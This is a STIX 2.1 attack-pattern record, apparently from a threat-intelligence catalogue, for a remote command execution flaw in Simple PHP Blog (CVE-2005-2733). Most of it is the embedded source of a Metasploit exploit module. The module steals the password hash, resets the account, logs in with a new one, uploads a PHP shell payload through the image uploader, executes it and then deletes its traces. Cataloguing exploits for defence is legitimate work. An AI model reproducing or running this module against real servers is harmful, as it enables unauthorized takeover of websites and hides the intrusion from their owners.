{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8acb2ee7-d3a4-43f4-95c7-113442b2c53e",
    "created": "2024-08-14T17:12:50.498958Z",
    "modified": "2024-08-14T17:12:50.498962Z",
    "name": "Simple PHP Blog Remote Command Execution",
    "description": " This module combines three separate issues within The Simple PHP Blog (<= 0.4.0) application to upload arbitrary data and thus execute a shell. The first vulnerability exposes the hash file (password.txt) to unauthenticated users. The second vulnerability lies within the image upload system provided to logged-in users; there is no image validation function in the blogger to prevent an authenticated user from uploading any file type. The third vulnerability occurs within the blog comment functionality, allowing arbitrary files to be deleted. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/sphpblog_file_upload.rb",
            "external_id": "sphpblog_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-2733"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Simple PHP Blog Remote Command Execution',\n      'Description'    => %q{\n          This module combines three separate issues within The Simple PHP Blog (<= 0.4.0)\n        application to upload arbitrary data and thus execute a shell. The first\n        vulnerability exposes the hash file (password.txt) to unauthenticated users.\n        The second vulnerability lies within the image upload system provided to\n        logged-in users; there is no image validation function in the blogger to\n        prevent an authenticated user from uploading any file type. The third\n        vulnerability occurs within the blog comment functionality, allowing\n        arbitrary files to be deleted.\n      },\n      'Author'         => [ 'Matteo Cantoni <goony[at]nothink.org>', 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2005-2733'],\n          ['OSVDB', '19012'],\n          ['BID', '14667'],\n          ['EDB', '1191'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'ConnectionType' => 'find',\n            },\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2005-08-25',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('URI', [true, \"Sphpblog directory path\", \"/sphpblog\"]),\n      ])\n  end\n\n  def check\n    res = send_request_raw({\n      'uri'     => normalize_uri(datastore['URI'], '/index.php')\n    }, 25)\n\n    if (res and res.body =~ /Simple PHP Blog (\\d)\\.(\\d)\\.(\\d)/)\n\n      ver = [ $1.to_i, $2.to_i, $3.to_i ]\n      vprint_status(\"Simple PHP Blog #{ver.join('.')}\")\n\n      if (ver[0] == 0 and ver[1] < 5)\n        if (ver[1] == 4 and ver[2] > 0)\n          return Exploit::CheckCode::Safe\n        end\n        return Exploit::CheckCode::Appears\n      end\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def retrieve_password_hash(file)\n\n    res = send_request_raw({\n      'uri'    => normalize_uri(datastore['URI'], file)\n    }, 25)\n\n    if (res and res.message == \"OK\" and res.body)\n      print_good(\"Successfully retrieved hash: #{res.body}\")\n      return res.body\n    else\n      fail_with(Failure::NotVulnerable, \"Failed to retrieve hash, server may not be vulnerable.\")\n      return false\n    end\n  end\n\n  def create_new_password(user, pass)\n\n    res = send_request_cgi({\n      'uri'     => normalize_uri(datastore['URI'], '/install03_cgi.php'),\n      'method'  => 'POST',\n      'data'    => \"user=#{user}&pass=#{pass}\",\n    }, 25)\n\n    if (res)\n      print_good(\"Successfully created temporary account.\")\n    else\n      print_error(\"Unable to create a temporary account!\")\n    end\n  end\n\n  def retrieve_session(user, pass)\n\n    res = send_request_cgi({\n      'uri'     => normalize_uri(datastore['URI'], \"/login_cgi.php\"),\n      'method'  => 'POST',\n      'data'    => \"user=#{user}&pass=#{pass}\",\n    }, 25)\n\n    if res\n      print_good(\"Successfully logged in as #{user}:#{pass}\")\n\n      if (res.get_cookies =~ /PHPSESSID=(.+);/)\n        session = $1\n        print_good(\"Successfully retrieved cookie: #{session}\")\n        return session\n      else\n        print_error(\"Error retrieving cookie!\")\n      end\n    else\n      print_error(\"No response received while logging in.\")\n    end\n  end\n\n  def upload_page(session, dir, newpage, contents)\n\n    boundary = rand_text_alphanumeric(6)\n\n    data = \"--#{boundary}\\r\\nContent-Disposition: form-data; name=\\\"userfile\\\"; \"\n    data << \"filename=\\\"#{newpage}\\\"\\r\\nContent-Type: text/plain\\r\\n\\r\\n\"\n    data << contents\n    data << \"\\r\\n--#{boundary}--\"\n\n    res = send_request_raw({\n      'uri'\t  => normalize_uri(datastore['URI'], \"/upload_img_cgi.php\"),\n      'method'  => 'POST',\n      'data'    => data,\n      'headers' =>\n      {\n        'Content-Type'\t => 'multipart/form-data; boundary=' + boundary,\n        'Content-Length' => data.length,\n        'Cookie'\t => \"my_id=#{session}; PHPSESSID=#{session}\",\n      }\n    }, 25)\n\n    if (res)\n      print_good(\"Successfully uploaded #{newpage}\")\n    else\n      print_error(\"Error uploading #{newpage}\")\n    end\n  end\n\n  def reset_original_password(hash, scriptlocation)\n\n    res = send_request_cgi({\n      'uri'\t => normalize_uri(datastore['URI'], scriptlocation),\n      'method' => 'POST',\n      'data'\t => \"hash=\" + hash,\n    }, 25)\n\n    if (res)\n      print_good(\"Successfully reset original password hash.\")\n    else\n      print_error(\"Error resetting original password!\")\n    end\n  end\n\n  def delete_file(file)\n\n    delete_path = \"/comment_delete_cgi.php?y=05&m=08&comment=.#{file}\"\n\n    res = send_request_raw({\n      'uri'\t=> normalize_uri(datastore['URI'], delete_path),\n    }, 25)\n\n    if (res)\n      print_good(\"Successfully removed #{file}\")\n    else\n      print_error(\"Error removing #{file}!\")\n    end\n  end\n\n  def cmd_shell(cmdpath)\n    print_status(\"Calling payload: #{cmdpath}\")\n\n    res = send_request_raw({\n      'uri'\t=> datastore['URI'] + cmdpath\n    }, 25)\n\n  end\n\n  def exploit\n\n    # Define the scripts to be uploaded to aid in exploitation\n    cmd_php = '<?php ' + payload.encoded + '?>'\n\n    reset_php = %Q|\n    <?php $hash = $_POST['hash'];\n    $fp = fopen(\"../config/password.txt\",\"w\");\n    fwrite($fp,$hash);\n    fpclose($fp);\n    ?>|\n\n    # Generate some random strings\n    cmdscript\t= rand_text_alphanumeric(20) + '.php'\n    resetscript\t= rand_text_alphanumeric(20) + '.php'\n    newuser \t= rand_text_alphanumeric(6)\n    newpass \t= rand_text_alphanumeric(6)\n\n    # Static files\n    directory \t= '/images/'\n    cmdpath \t= directory + cmdscript\n    resetpath \t= directory + resetscript\n    passwdfile \t= '/config/password.txt'\n\n    # Let's do this thing\n    hash = retrieve_password_hash(passwdfile)\n    delete_file(passwdfile)\n    create_new_password(newuser, newpass)\n    session = retrieve_session(newuser, newpass)\n    upload_page(session, directory, resetscript, reset_php)\n    upload_page(session, directory, cmdscript, cmd_php)\n    reset_original_password(hash, resetpath)\n    delete_file(resetpath)\n    cmd_shell(cmdpath)\n    delete_file(cmdpath)\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-08-25",
    "x_mitre_platforms": [
        "php'"
    ]
}